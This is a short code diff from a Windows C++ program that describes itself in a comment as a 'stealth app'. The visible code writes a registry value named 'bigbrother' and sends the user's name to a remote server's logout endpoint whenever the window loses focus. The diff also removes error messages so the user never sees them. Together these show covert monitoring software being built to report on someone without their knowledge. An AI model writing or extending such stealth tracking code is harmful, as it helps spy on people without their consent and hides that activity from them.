@@ -71,7 +71,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, 
                     hKey,
                     "bigbrother"
                 );
-
             }
             return 0;
         }
@@ -140,17 +139,20 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, 
         {
             switch (msg.message)
             {
-            case WM_QUIT:
-                HttpRequest logoutReportRequest{ serverAddress, std::to_string(serverPort) , std::string("/api/logout/") + userName, 11 };
-                logoutReportRequest.Get();
+            case WM_ACTIVATE:
+                if (wParam == WA_INACTIVE)
+                {
+                    HttpRequest logoutReportRequest{ serverAddress, std::to_string(serverPort) , std::string("/api/logout/") + userName, 11 };
+                    logoutReportRequest.Get();
+                }
                 return 0;
             }
         }
     }
-    catch (const std::exception& exception)
+    catch (const std::exception&)
     {
-        MessageBoxA(NULL, exception.what(), "damn", MB_OK);
+        //something goes wrong, we dont want to show error messages to user
+        //because this it stealth app
     }
-    
     return 0;
 }
